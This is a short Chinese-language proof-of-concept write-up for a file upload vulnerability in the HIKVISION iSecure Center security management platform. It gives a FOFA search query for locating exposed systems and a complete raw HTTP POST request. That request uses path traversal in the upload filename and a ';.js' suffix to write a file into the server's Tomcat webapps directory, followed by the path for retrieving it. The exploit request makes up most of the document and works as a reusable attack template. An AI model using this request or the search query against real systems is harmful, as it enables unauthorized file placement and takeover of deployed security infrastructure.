# HIKVISION iSecure Center综合安防管理平台文件上传

## 1.漏洞描述

HIKVISION iSecure Center综合安防管理平台存在文件上传漏洞

## 2.搜索语法

```plain
app="HIKVISION-iSecure-Center"
```

## 3.漏洞复现

```plain
POST /center/api/files;.js HTTP/1.1
Host: 127.0.0.1
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 251
Content-Type: multipart/form-data; boundary=e54e7e5834c8c50e92189959fe7227a4

--e54e7e5834c8c50e92189959fe7227a4
Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/hhh.txt"
Content-Type: application/octet-stream

hhh
--e54e7e5834c8c50e92189959fe7227a4--
```

响应包如下：

![image-20240613201208922](.\image-20240613201208922.png)
![image](https://github.com/hardog123/poc-exp/assets/170905460/add33246-0558-43f8-9fb2-68aa120c2a5c)


拼接路径访问：

/clusterMgr/hhh.txt;.js

![image-20240613201305546](.\image-20240613201305546.png)
